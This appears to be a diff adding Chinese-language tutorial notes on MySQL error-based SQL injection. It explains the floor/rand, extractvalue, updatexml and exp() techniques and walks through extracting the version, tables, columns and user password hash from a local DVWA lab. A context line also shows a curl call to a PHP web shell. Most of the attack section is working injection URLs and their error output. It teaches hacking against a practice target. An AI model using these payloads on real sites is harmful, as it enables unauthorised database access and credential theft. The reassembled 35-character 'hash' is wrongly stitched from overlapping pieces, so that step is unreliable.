@@ -1578,7 +1578,196 @@ curl -d "hacker=echo getcwd();" http://127.0.0.1/images/shell.php
 
 ### 报错注入 
 
+#### 报错注入定义
 
+- 报错注入（Error based Injection）
+- 是一种 SQL 注入的类型，用于使 SQL 语句报错的语法，用于注入结果无回显但错误信息有输出的情况。
+- 返回的错误信息即是攻击者需要的信息。 
+
+
+
+#### 报错注入原理
+
+- 报错注入（Error based Injection）
+- MySQL 的报错注入主要是利用 MySQL 的一些逻辑漏洞，如 BigInt 大数溢出等，由此可以将 MySQL 报错注入主要分为以下几类：
+
+1. BigInt 等数据类型溢出；
+2. Xpath 语法错误；
+3. count() + rand() + group_by() 导致重复；
+4. 空间数据类型函数错误。 
+
+
+
+#### 报错注入函数
+
+很多函数会导致 MySQL 报错并显示出数据：
+1. floor 函数；
+2. extractvalue 函数；（最多32字符）
+3. updatexml 函数；
+4. exp() 函数； 
+
+
+
+#### 函数 - rand([N]) 
+
+- rand([N]) - 返回一个随机浮点数 v，范围是 0<=v<1.0
+- N 是可选提供的，如果提供了N，则会设定N为一个SEED 
+- 测试SQL:
+  - select rand() from test;
+    - 每一次返回的随机数都是不一样的
+  - select rand(0) from information_schema.tables limit 1,10;
+    - 每一次返回的随机数都是相同的
+  - select rand() from information_schema.tables limit 1,10;
+    - 每一次返回的随机数都是不一样的
+- 官方解释rand 函数
+  - https://dev.mysql.com/doc/refman/8.0/en/mathematical-functions.html#function_rand
+  - [`RAND()`](https://dev.mysql.com/doc/refman/8.0/en/mathematical-functions.html#function_rand) in a `WHERE` clause is evaluated for every row (when selecting from one table) or combination of rows (when selecting from a multiple-table join). 
+
+
+
+#### 函数 - floor(x) 
+
+- floor(x) - 返回不大于 x 的最大整数 
+- 测试SQL:
+  - select floor(0.1), floor(0.50), floor(0.99), floor(1.9), floor(2.1);
+
+
+
+#### 函数 - count(x) 
+
+- count(x) - 返回 x 数据集的数量 
+- 测试SQL:
+  - select * from test;
+  - select count(*) from test;
+  - select count(*) from test where id=1;
+
+
+
+#### 函数 - concat(x) 
+
+- 测试SQL:
+  - select count(\*),concat((select user()), floor(rand(0)*2)) x from test group by x;
+    - 没报错，输出 2 | root@localhost1
+  - insert into test values (1, 'test3');  -- 插入重复的 ID 数据
+  - select * from test;
+  - select count(\*),concat((select user()),floor(rand(0)*2))x from test group by x;
+    - 报错了，输出 ERROR 1062 (23000): Duplicate entry 'root@localhost1' for key 'group_key'
+- 思考：为什么会触发错误呢？ 
+- 继续测试
+  - select floor(rand(0)*2) from information_schema.tables limit 1,10;
+  - 结合 rand 函数的特性，继续思考函数报错的原因 
+    - 在进行 group by 的时候，会出现创建一个虚拟表的操作，使用的主键是 x
+    - 查询主键 0，不存在，直接插入
+    - 插入时重新计算，主键成为1
+    - 查询主键1，存在，直接增加1
+    - 查询主键0，主键不存在，直接插入
+    - 插入时重新计算，主键成为1，无法插入数值为1的主键（主键1的内容已经存在）
+      - 主键插入冲突 --> 报错 
+      - Duplicate 
+
+
+
+#### 函数 - extractvalue 
+
+- 报错注入 pyload 原理（ EXTRACTVALUE ） 
+  - ?id=1' and extractvalue(1, concat(0x7e, (select @@version))) -- ' 
+- 测试SQL:
+  - select @@version;
+  - select extractvalue(1, (select @@version));
+    - 报错，ERROR 1105 (HY000): XPATH syntax error: '.43'
+  -  select extractvalue(1, concat(0x7e, (select @@version)));
+    - 报错，ERROR 1105 (HY000): XPATH syntax error: '~5.6.43'
+- 思考：
+  1. 为什么要使用 concat 函数呢？
+     1. 将报错触发条件，与有价值的数据结合在一起
+  2. 0x7e 是什么？ 
+     1. 0x7e 是一个 ~，可以保证其无法被执行，而报错
+
+
+
+#### 函数 - updatexml 
+
+- 报错注入 payload 原理（ UPDATEXML ） 
+  - ?id=2' and updatexml(1,concat(0x7e,(SELECT @@version)),1) -- ' 
+- 测试SQL:
+  - select updatexml(1,concat(0x7e,(select @@version)),1);
+    - 报错，ERROR 1105 (HY000): XPATH syntax error: '~5.6.43'
+
+
+
+#### 函数 - exp 
+
+- 报错注入 payload 原理（ exp ） 
+  - 注意，exp() 产生错误，但是并没有爆出 database()，但是发现 database() 是表达式，在脚本语言中会转化为相应的值，从而爆出数据库名。 
+- 测试SQL:
+  - select exp(~(select * from (select database()) x));
+    - 报错，ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select `x`.`database()` from (select database() AS `database()`) `x`)))'
+  - select * from (select database()) x;
+  - select ~(select * from (select database()) x);
+    - 输出， 18446744073709551615
+
+
+
+#### DVWA 容器安装
+
+- 下载：docker pull registry.cn-shanghai.aliyuncs.com/yhskc/dvwa
+- 运行：docker run -d -p 0.0.0.0:81:80 registry.cn-shanghai.aliyuncs.com/yhskc/dvwa
+  - 容器内端口为80，映射为主机的81端口
+- 测试：
+  - http://127.0.0.1:81/
+  - 用户名：admin
+  - 密码：password
+
+
+
+
+
+#### 报错注入实战
+
+- 安装，并登录靶机
+- 选择bug类型：SQL Injection
+- 使用 单引号 测试
+  - http://127.0.0.1:81/vulnerabilities/sqli/?id='&Submit=Submit#
+  - 报错，You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1
+- 使用 extractvalue 函数 进行报错注入
+  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,(select @@version))  -- &Submit=Submit#
+  - 报错，XPATH syntax error: '.26-MariaDB-0+deb9u1'
+- 获取 用户 和 数据库内容
+  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,concat(0x7e, user(), 0x7e, database()))  -- &Submit=Submit#
+  - 报错，XPATH syntax error: '\~app@localhost~dvwa'
+- 通过information_schema.tables，获取数据表名称
+  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,concat(0x7e, (select table_name from information_schema.tables where table_schema='dvwa' limit 0,1)))  -- &Submit=Submit#
+  - 通过更改限制，或者用户表 users
+  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,concat(0x7e, (select table_name from information_schema.tables where table_schema='dvwa' limit 2,1)))  -- &Submit=Submit#
+- 通过information_schema.columns，获取用户表字段
+  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,concat(0x7e, (select column_name from information_schema.columns where table_name='users' limit 0,1)))  -- &Submit=Submit#
+  - 通过更改限制，或者用户表 的字段 user 与 password
+  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,concat(0x7e, (select column_name from information_schema.columns where table_name='users' limit 3,1)))  -- &Submit=Submit#
+  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,concat(0x7e, (select column_name from information_schema.columns where table_name='users' limit 4,1)))  -- &Submit=Submit#
+- 获取用户名和密码
+  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,concat(0x7e, (select user from dvwa.users limit 0,1)))  -- &Submit=Submit#
+  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,concat(0x7e, (select password from dvwa.users limit 0,1)))  -- &Submit=Submit#
+  - 问题：密码长度超过32位，导致真正的加密密码只有31位，不全
+- Mid() 函数
+  - 用于从文本字段中提取字符，自定义长度与起始位置
+  - MID( string, start_position, length )
+  - link：https://www.techonthenet.com/mysql/functions/mid.php
+- 获取真正的密码
+  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,mid(concat(0x7e, (select password from dvwa.users limit 0,1)), 1, 29))  -- &Submit=Submit#
+    - 获得，XPATH syntax error: '~5f4dcc3b5aa765d61d8327deb882cf9'
+  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,mid(concat(0x7e, (select password from dvwa.users limit 0,1)), 29, 29))  -- &Submit=Submit#
+    - 获得，XPATH syntax error: 'cf99'
+  - 真正的密码为，5f4dcc3b5aa765d61d8327deb882cf9cf99
+  - https://www.cmd5.com/ 解密，得到明文密码为 password
+- 扩展练习
+  - 通过 floor 报错,注入语句如下:
+    - select 1 from (select count(\*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a;
+  - 通过 exp 报错,注入语句如下:
+    - select exp(~(select * from (select user())x)); 
+
+
+
+### 堆叠注入 
 
 
 
